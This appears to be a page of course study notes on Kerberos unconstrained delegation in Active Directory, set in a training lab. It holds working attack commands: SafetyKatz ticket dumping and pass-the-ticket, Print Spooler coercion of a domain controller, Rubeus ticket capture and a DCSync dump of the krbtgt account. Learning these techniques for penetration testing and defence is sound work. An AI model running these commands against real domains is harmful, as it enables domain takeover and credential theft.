# Uncostrained Delegation

## Unconstrained Delegation

Unconstrained delegation allows a service to impersonate a user to any other service in the domain.\
When this is enabled, the domain controller includes the user's TGT in the TGS. The TGT is then extracted by the service and stored in LSASS, allowing it to be reused for impersonation.\
This behavior makes unconstrained delegation highly abusable.

**Delegation Process Flow:**

1. A user authenticates to the Domain Controller and receives a TGT.
2. The user requests a TGS for a service (e.g., a web server).
3. The user sends both the TGT and the TGS to the service.
4. The service extracts the user's TGT and requests a new TGS to access another resource (e.g., a database server).
5. The service authenticates to the second server as the user.

***

### Enumeration

To identify domain machines or users with unconstrained delegation enabled:

*   **PowerView:**

    ```powershell
    Get-DomainComputer -Unconstrained
    ```
*   **ActiveDirectory Module:**

    ```powershell
    Get-ADComputer -Filter {TrustedForDelegation -eq $True}
    Get-ADUser -Filter {TrustedForDelegation -eq $True}
    ```

***

### Abusing Unconstrained Delegation

1. **Compromise a server with unconstrained delegation enabled.**
2. **Wait for or coerce a domain admin to authenticate to it.**
3.  **Dump cached TGTs:**

    ```powershell
    SafetyKatz.exe "sekurlsa::tickets /export"
    ```
4.  **Inject a Domain Admin’s TGT:**

    ```powershell
    SafetyKatz.exe "kerberos::ptt C:\Users\appadmin\Documents\user1\[0;2ceb8b3]-2-0-60a10000-Administrator@krbtgt-DOLLARCORP.MONEYCORP.LOCAL.kirbi"
    ```

***

## Coercion Techniques

Certain Windows services allow **any authenticated user** to coerce one machine into authenticating to another. These include:

| Protocol | Service            | Default Enabled | Port    |
| -------- | ------------------ | --------------- | ------- |
| MS-RPRN  | Print Spooler      | Yes             | 445 SMB |
| MS-WSP   | Windows Search     | No              | 445 SMB |
| MS-DFSNM | DFS Namespace Mgmt | No              | 445 SMB |

Use these coercion techniques to force authentication from a DC to a controlled host.

***

### Capturing and Reusing the TGT

1.  **On the attacker's controlled server (e.g., `dcorp-appsrv`), monitor for TGTs:**

    ```powershell
    Rubeus.exe monitor /interval:5 /nowrap
    ```
2.  **On the student's VM, coerce authentication using MS-RPRN:**

    ```powershell
    MS-RPRN.exe \\dcorp-dc.dollarcorp.moneycorp.local \\dcorp-appsrv.dollarcorp.moneycorp.local
    ```
3.  **Once the TGT is captured (Base64 encoded), inject it into memory:**

    ```powershell
    Rubeus.exe ptt /ticket:<Base64_TGT>
    ```
4.  **Dump secrets using DCSync:**

    ```powershell
    SafetyKatz.exe "lsadump::dcsync /user:dcorp\krbtgt"
    ```

### Lab

* Learning Object 15

### Labs

* [Learning Object 16 lab](../../lab/16-lo1-6.md)
* [Learning Object 17 lab](../../lab/17-lo1-7.md)
